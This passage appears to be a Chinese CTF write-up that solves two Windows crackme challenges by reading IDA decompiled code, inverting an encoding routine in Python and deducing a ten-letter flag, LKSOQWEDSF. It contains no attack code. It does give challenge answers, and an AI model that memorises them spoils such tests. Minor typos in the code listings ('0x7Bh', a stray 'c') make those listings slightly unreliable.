<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">DWORD __<span class="function">stdcall <span class="title">sub_401020</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  v1 = sub_401080(dword_403428);</span><br><span class="line">  v2 = sub_401080(v1);</span><br><span class="line">  sub_401080(v2);</span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( dword_403428[v4] == byte_403018[v4] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 -= <span class="number">4</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      MessageBoxA(<span class="number">0</span>, Caption, Caption, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个函数很简单，就是将数据进行了处理，我们可以在函数名处按n键对函数进行重命名，方便我们之后的观看，这里我们就命名为encode，而数据我们直接dump出来，也就是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="number">0x68</span>, <span class="number">0x23</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0xC8</span>, <span class="number">0xC9</span>, <span class="number">0x1F</span>, <span class="number">0x93</span>, <span class="number">0xF3</span>, <span class="number">0xFA</span>, <span class="number">0xFF</span>, <span class="number">0x9E</span>, <span class="number">0x37</span>, <span class="number">0x77</span>, <span class="number">0x1B</span>, <span class="number">0x83</span>, <span class="number">0x81</span>, <span class="number">0x69</span>, <span class="number">0x6D</span>, <span class="number">0x46</span>, <span class="number">0x64</span>, <span class="number">0xCF</span>, <span class="number">0x4B</span>, <span class="number">0xAD</span>, <span class="number">0x6A</span>, <span class="number">0xA8</span>, <span class="number">0xAA</span>, <span class="number">0xEA</span>, <span class="number">0x41</span>, <span class="number">0x45</span>, <span class="number">0x7B</span>h, <span class="number">0xAB</span>]</span><br></pre></td></tr></table></figure>
<p>第二个函数稍显复杂，首先是对我们输入的数据进行encode，然后返回值在encode，然后返回值再encode。然后是一段循环处理，可以看到v4作为数组的下标是在不断++的，而一旦encode后的数据和我们输入的某一位不一样，那就直接return了，v3则是作为计数器，他的初始值等于我们的数据长度，而在每次都会-4，最后如果减到了&lt;4的情况，就会弹出一个MessageBox</p>
<p>接下来的任务就是分析encode了，ida跳过去（这里我已经把一些关键变量改好名字了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__usercall sub_401080@&lt;eax&gt;(_BYTE *a1@&lt;edi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> count; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *<span class="built_in">array</span>; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">1</span> - a1;</span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">array</span> = a1;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = __ROL1__(*<span class="built_in">array</span>, <span class="number">3</span>);      <span class="comment">//ROL是移位（就是c语言的位操作）的意思</span></span><br><span class="line">    *<span class="built_in">array</span> = v4;        			</span><br><span class="line">    <span class="keyword">if</span> ( count &gt;= <span class="number">1</span> ) </span><br><span class="line">      *<span class="built_in">array</span> = v4 ^ a1[count - <span class="number">1</span>];</span><br><span class="line">    v5 = __ROL1__(*<span class="built_in">array</span>, <span class="number">4</span>) + <span class="number">3</span>;</span><br><span class="line">    v6 = __ROL1__(<span class="built_in">array</span>[<span class="number">1</span>], <span class="number">3</span>);</span><br><span class="line">    *<span class="built_in">array</span> = v5;                     <span class="comment">//数据被四个分为了一组，这是每组的第一位</span></span><br><span class="line">    <span class="built_in">array</span>[<span class="number">1</span>] = v6;       </span><br><span class="line">    <span class="keyword">if</span> ( &amp;<span class="built_in">array</span>[v1] &gt;= <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">array</span>[<span class="number">1</span>] = v6 ^ v5;</span><br><span class="line">    v7 = __ROL1__(<span class="built_in">array</span>[<span class="number">1</span>], <span class="number">4</span>) + <span class="number">3</span>;</span><br><span class="line">    v8 = __ROL1__(<span class="built_in">array</span>[<span class="number">2</span>], <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">array</span>[<span class="number">1</span>] = v7;					<span class="comment">//每组数据的第二位</span></span><br><span class="line">    <span class="built_in">array</span>[<span class="number">2</span>] = v8;</span><br><span class="line">    <span class="keyword">if</span> ( &amp;<span class="built_in">array</span>[<span class="number">2</span> - a1] &gt;= <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">array</span>[<span class="number">2</span>] = v8 ^ v7;</span><br><span class="line">    v9 = __ROL1__(<span class="built_in">array</span>[<span class="number">2</span>], <span class="number">4</span>) + <span class="number">3</span>;</span><br><span class="line">    v10 = __ROL1__(<span class="built_in">array</span>[<span class="number">3</span>], <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">array</span>[<span class="number">2</span>] = v9;               <span class="comment">//第三位</span></span><br><span class="line">    <span class="built_in">array</span>[<span class="number">3</span>] = v10;</span><br><span class="line">    <span class="keyword">if</span> ( &amp;<span class="built_in">array</span>[<span class="number">3</span> - a1] &gt;= <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">array</span>[<span class="number">3</span>] = v10 ^ v9;        </span><br><span class="line">    <span class="built_in">array</span>[<span class="number">3</span>] = __ROL1__(<span class="built_in">array</span>[<span class="number">3</span>], <span class="number">4</span>) + <span class="number">3</span>;    <span class="comment">//第四位</span></span><br><span class="line">    count += <span class="number">4</span>;       <span class="comment">//起到了计数器的作用  </span></span><br><span class="line">    <span class="built_in">array</span> += <span class="number">4</span>;       <span class="comment">//注意这里不是真的地址+4，而是由第1个数据变为第1+4个数据，可以替换为数组下标</span></span><br><span class="line">    <span class="keyword">if</span> ( count &gt;= <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = <span class="number">1</span> - a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1 + <span class="number">1</span>;     <span class="comment">//注意这里返回的是a1加1，也就是传入数据的下一位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到该函数将传入的数据四个分为一组进行处理移位，且处理有规律可言，我们对上述的函数进行简化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> * <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> * pt)</span> </span>&#123;</span><br><span class="line">    pt[<span class="number">0</span>] = rol(pt[<span class="number">0</span>], <span class="number">7</span>) + <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        pt[i] = rol(pt[i], <span class="number">3</span>) ^ pt[i<span class="number">-1</span>];</span><br><span class="line">        pt[i] = rol(pt[i], <span class="number">4</span>) + <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pt+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于移位操作和减法都是简单可逆（减的加上，左移的右移回去）的，所以我们很轻松就可以写出解密函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(list, fuck)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>-fuck+<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>):</span><br><span class="line">        list[i + fuck] = ror(list[i + fuck]<span class="number">-3</span>,<span class="number">4</span>) &amp; <span class="number">0xff</span></span><br><span class="line">        list[i + fuck] = ror((list[i + fuck] &amp; <span class="number">0xff</span>) ^ (list[i + fuck - <span class="number">1</span>] &amp; <span class="number">0xff</span>),<span class="number">3</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    list[fuck] = ror(list[fuck]<span class="number">-3</span>,<span class="number">7</span>) &amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure>
<p>这里要注意一个细节问题，在ida中我们可以清楚的看到我们传入的数据是unsigned char（也就是一个字节）类型的，而我们在使用python去进行解密的时候由于用的是int的list，所以会产生数据大小不对称的问题，我们这里用&amp;0xff的方式来限制我们的数据大小。</p>
<p>最后的脚本要注意，程序先将数据encode，接着将输入encode，输入的返回值encode，返回值再encode，所以我们在逆向解密时，应该先将数据encode，再将数据decode，再将数据从1的位置decode，再将数据从2的位置decode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encode(list)</span><br><span class="line">decode(list,<span class="number">2</span>)</span><br><span class="line">decode(list,<span class="number">1</span>)</span><br><span class="line">decode(list,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>具体的脚本就不放了，最终解得的flag是</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fyj21bw1pkj30e401kt8n.jpg" alt="image-20181225160804820"></p>
<p>这道题目就到这里了，难度不是很高，主要还是要耐心去逆向算法，</p>
<h1 id="Open-Windows"><a href="#Open-Windows" class="headerlink" title="Open Windows"></a>Open Windows</h1><p>还是按照上面的方法找到DialogFunc的位置，这里要提到一些新知识了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">BOOL __<span class="function">stdcall <span class="title">DialogFunc</span><span class="params">(HWND a1, UINT vm_command, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  WPARAM v4; <span class="comment">// ebx</span></span><br><span class="line">  HWND v6; <span class="comment">// esi</span></span><br><span class="line">  HWND v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> CHAR *v8; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( vm_command &gt; <span class="number">0x110</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( vm_command == <span class="number">274</span> &amp;&amp; a3 == <span class="number">61536</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      HIBYTE(a3) = <span class="number">0</span>;</span><br><span class="line">      sub_4012E0((_BYTE *)&amp;a3 + <span class="number">3</span>);</span><br><span class="line">      v8 = Src;</span><br><span class="line">      <span class="keyword">if</span> ( dword_403848 - (_DWORD)Src == <span class="number">11</span> &amp;&amp; x == <span class="number">771</span> &amp;&amp; y == <span class="number">0x63A421C737F6FFE0</span>i64 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( sub_401040(Src) )</span><br><span class="line">          MessageBoxA(<span class="number">0</span>, v8, <span class="string">"success"</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      EndDialog(a1, <span class="number">61536</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( vm_command )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x110</span>u:                              <span class="comment">// 初始化</span></span><br><span class="line">        v7 = a1;</span><br><span class="line">        y = <span class="number">1</span>i64;</span><br><span class="line">        x = <span class="number">0</span>i64;</span><br><span class="line">        dword_4037CC = GetWindowLongA(a1, <span class="number">-6</span>);</span><br><span class="line">        h = LoadBitmapA((HINSTANCE)dword_4037CC, (LPCSTR)<span class="number">0x68</span>);</span><br><span class="line">        GetObjectA(h, <span class="number">24</span>, &amp;unk_403820);</span><br><span class="line">        SetWindowPos(v7, HWND_MESSAGE|<span class="number">0x2</span>, <span class="number">0</span>, <span class="number">0</span>, dword_403824, cy, <span class="number">6u</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xF</span>u:                                <span class="comment">// 画图</span></span><br><span class="line">        v6 = a1;</span><br><span class="line">        hdc = BeginPaint(a1, &amp;Paint);</span><br><span class="line">        hdcSrc = CreateCompatibleDC(hdc);</span><br><span class="line">        SelectObject(hdcSrc, h);</span><br><span class="line">        BitBlt(hdc, <span class="number">0</span>, <span class="number">0</span>, dword_403824, cy, hdcSrc, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xCC0020</span>u);</span><br><span class="line">        DeleteDC(hdcSrc);</span><br><span class="line">        EndPaint(v6, &amp;Paint);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x101</span>u:                              <span class="comment">// 实际操作的keyup</span></span><br><span class="line">        v4 = a3;</span><br><span class="line">        HIBYTE(a1) = a3;</span><br><span class="line">        sub_4012E0((_BYTE *)&amp;a1 + <span class="number">3</span>);</span><br><span class="line">        y *= v4;</span><br><span class="line">        x += v4;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到进入函数后会对vm_command（我这里进行了重命名，ida原本应该是a2）进行比较，对不同的vm_command进行不同的操作。这其实就是windows的消息机制，vvm_command就是个消息，而我们的DialogFunc会对不同消息进行不同的响应，举个例子，你的鼠标点击、键盘敲击等等都属于一种消息，当我们点击“关闭”按钮的时候，就发送了一个关闭窗口的消息，他有一个对应的值，这时windows检测到了这个消息发生了，就会进行关闭窗口的操作并且执行用户写在此处的相关代码</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fyjxye5gcyj317k0hqdhf.jpg" alt="image-20181226103224409"></p>
<p>当我们分析这个程序时，首先从vm_command来将程序划为不同的区域，如：case 0x110处就是用来初始化的函数，而0xF则涉及到图形绘制的一些功能，很显然这都不是我们要关心的，而case 0x101我们则要特别注意，因为0x101代表的事件是用户在使用键盘按键（准确的说是按键“弹起来”）了。</p>
<p>在这里可以看到函数调用了两个函数，然后将我们的键盘对应的按键的值加给了x，乘给了y，也就是说x是累加器，y是累乘器。HIBYTE是从给定的16位中提取其中的高位部分，因为我们键盘上的按键是拿ASCII来标示的，所以其实只占用了一个字节，也就是8位，所以也就是让a1的高位部分等于键盘输入的按键值</p>
<p>接着进入第二个函数来分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__usercall sub_4012E0@&lt;eax&gt;(_BYTE *a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// eax</span></span><br><span class="line">  LPCSTR v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v2 = konw_what;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= konw_what || (v3 = Src, Src &gt; v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( konw_what == dword_40384C )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401350();</span><br><span class="line">      v2 = konw_what;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v2 = *v1;</span><br><span class="line">      v2 = konw_what;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v1 - Src;</span><br><span class="line">    <span class="keyword">if</span> ( konw_what == dword_40384C )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401350();</span><br><span class="line">      v2 = konw_what;</span><br><span class="line">      v3 = Src;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v2 = v3[v4];</span><br><span class="line">      <span class="keyword">return</span> (konw_what++ + <span class="number">1</span>);c</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v2 + <span class="number">1</span>;</span><br><span class="line">  konw_what = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这个函数稍显复杂，我们当然可以一步一步慢慢分析，但我们可以从第15行的函数中发现一些线索，我们点进去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401350</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  LPCSTR v0; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = Src;</span><br><span class="line">  v1 = konw_what - Src;</span><br><span class="line">  <span class="keyword">if</span> ( (konw_what - Src) &gt; <span class="number">0xFFFFFFFE</span> )</span><br><span class="line">    <span class="built_in">std</span>::_Xlength_error(<span class="string">"vector&lt;T&gt; too long"</span>);</span><br><span class="line">  result = v1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt; dword_40384C - v0 )</span><br><span class="line">    result = sub_4013A0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很显然这里实现了类似异常检测的功能，当我们的know_what（命名鬼才）-src的值过大的时候就会产生too long的错误，我们就可以推测，know_what - src的值就应该是用户输入的长度。</p>
<p>最后一部分是关闭窗口的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( konw_what - Src == <span class="number">11</span> &amp;&amp; x == <span class="number">771</span> &amp;&amp; y == <span class="number">0x63A421C737F6FFE0</span>i64 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( sub_401040(Src) )</span><br><span class="line">    MessageBoxA(<span class="number">0</span>, v8, <span class="string">"success"</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到他要求我们输入10个字符，和为771，乘积为0x63A421C737F6FFE0，，接着还会调用一个函数，在点进去看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __usercall sub_401040@&lt;eax&gt;(<span class="keyword">const</span> <span class="keyword">char</span> *input@&lt;ebx&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> data; <span class="comment">// al</span></span><br><span class="line">  _DWORD *judge_table; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> count; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// [esp+0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) == <span class="number">10</span> )      <span class="comment">//检测输入长度是否为10</span></span><br><span class="line">  &#123;  </span><br><span class="line">    i = <span class="number">0</span>;                       <span class="comment">//循环变量我用i、j、count进行了标示</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> ) </span><br><span class="line">    &#123;</span><br><span class="line">      data = input[i];</span><br><span class="line">      <span class="keyword">if</span> ( data &gt; <span class="number">90</span> || data &lt; <span class="number">65</span> )             <span class="comment">// 循环每一个值检测是否为大写字母</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++i &gt;= <span class="number">10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        judge_table = &amp;table;      </span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        v7 = &amp;table;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          count = j;</span><br><span class="line">          <span class="keyword">if</span> ( j &lt; <span class="number">10</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">          judge_table += <span class="number">0x11</span>;         <span class="comment">//judge_table每0x11个是一组</span></span><br><span class="line">          ++j;</span><br><span class="line">          v7 = judge_table;            </span><br><span class="line">          <span class="keyword">if</span> ( judge_table &gt;= &amp;border )    <span class="comment">//检查judge_table是否到头了</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( input[j] &gt; input[count] == *judge_table )   <span class="comment">//检测input的每个值和所有的值比较的结果是不是符合judge_table的结果</span></span><br><span class="line">        &#123;</span><br><span class="line">          ++count;</span><br><span class="line">          ++judge_table;</span><br><span class="line">          <span class="keyword">if</span> ( count &gt;= <span class="number">10</span> )         </span><br><span class="line">          &#123;</span><br><span class="line">            judge_table = v7;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;         <span class="comment">//这里实现了嵌套循环的功能</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逻辑也不难，首先检测每个值是不是都是大写字母，然后就是依次拿出input的每个值，把值和另外的其他的值进行比较，且比较的结果要符合judge_table的里保存的真值。而由于judge_table是16个一循环的，我们可以把它当作一个矩阵结构，然后使用它的前十行前十列即可。</p>
<p>到这里我们就有了如下的信息</p>
<ul>
<li>flag长度为10</li>
<li>flag的每个值和另外的值比较的结果满足judge_table</li>
<li>所有的值都是大写字母</li>
<li>和为771，乘积为0x63A421C737F6FFE0</li>
</ul>
<p>我们可以通过分解乘积，将分解出的值固定在大写字母范围以内的方式来确定输入的字母，然后提取出来judge_table来搞定字母的顺序</p>
<p>最终flag为<strong>LKSOQWEDSF</strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
